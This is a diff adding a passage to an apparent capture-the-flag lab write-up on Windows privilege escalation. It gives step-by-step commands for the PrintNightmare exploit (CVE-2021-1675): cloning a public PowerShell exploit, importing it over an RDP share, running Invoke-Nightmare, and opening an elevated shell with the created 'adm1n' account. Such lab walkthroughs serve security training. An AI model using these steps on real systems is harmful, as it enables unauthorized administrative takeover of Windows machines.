@@ -131,7 +131,44 @@ Task 6 Attack Privilege Escalation
 
 --- 
 
+**Answer the questions below**
 
+We will use PrintNightmare to elevate our privileges on this target.
+
+
+### There are many different implementations of PrintNightmare available. You are advised to use a PowerShell version written by Caleb Stewart and John Hammond.
+
+
+### Navigate to the /tmp directory of your attacking VM, then clone the repository.
+
+
+`cd /tmp`
+`git clone https://github.com/calebstewart/CVE-2021-1675`
+
+- Now, on the RDP session, open a powershell and run the following command:
+
+`. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1` 
+
+> This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!
+
+![image](https://user-images.githubusercontent.com/86648102/135426765-0c782b7e-5390-4151-88a4-08c738764e35.png)
+
+- Next, in powershell, run `Invoke-Nightmare`
+
+![image](https://user-images.githubusercontent.com/86648102/135427022-bdba10ff-1795-4dd3-95e7-e5069d3736bb.png)
+
+We can now make use of our brand new admin account!
+Run:
+
+`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`
+
+Input as  Password :`P@ssw0rd` (generated before with the script)
+
+Run `whoami /groups`
+
+![image](https://user-images.githubusercontent.com/86648102/135427571-8b68d13f-14b7-4367-9aa3-007fc66231b2.png)
+
+Good. We now have admin on this machine.
 
 
 
